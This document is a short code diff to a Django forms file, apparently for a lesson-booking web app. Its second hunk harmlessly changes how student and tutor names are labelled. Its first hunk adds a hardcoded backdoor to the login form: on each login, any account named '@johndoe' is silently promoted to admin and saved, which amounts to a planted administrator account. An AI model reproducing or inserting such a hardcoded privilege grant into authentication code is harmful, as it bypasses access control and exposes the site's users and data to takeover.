@@ -24,6 +24,13 @@ class LogInForm(forms.Form):
             username = self.cleaned_data.get('username')
             password = self.cleaned_data.get('password')
             user = authenticate(username=username, password=password)
+
+            # ensure "@johndoe" is admin
+            if user:
+                if username == '@johndoe':
+                    if user.user_type != 'admin':
+                        user.user_type = 'admin'
+                        user.save()
         return user
 
 
@@ -259,6 +266,14 @@ class BookingForm(forms.ModelForm):
     class Meta:
         model = Booking
         fields = ['term','lesson_type', 'student', 'tutor']
+
+    def __init__(self, *args, **kwargs):
+        super().__init__(*args, **kwargs)
+        # student + tutor fields display only usernames
+        self.fields['student'].queryset = Student.objects.all()
+        self.fields['student'].label_from_instance = lambda obj: obj.username.username
+        self.fields['tutor'].queryset = Tutor.objects.all()
+        self.fields['tutor'].label_from_instance = lambda obj: obj.username.username
 
     def clean(self):
         cleaned_data = super().clean()
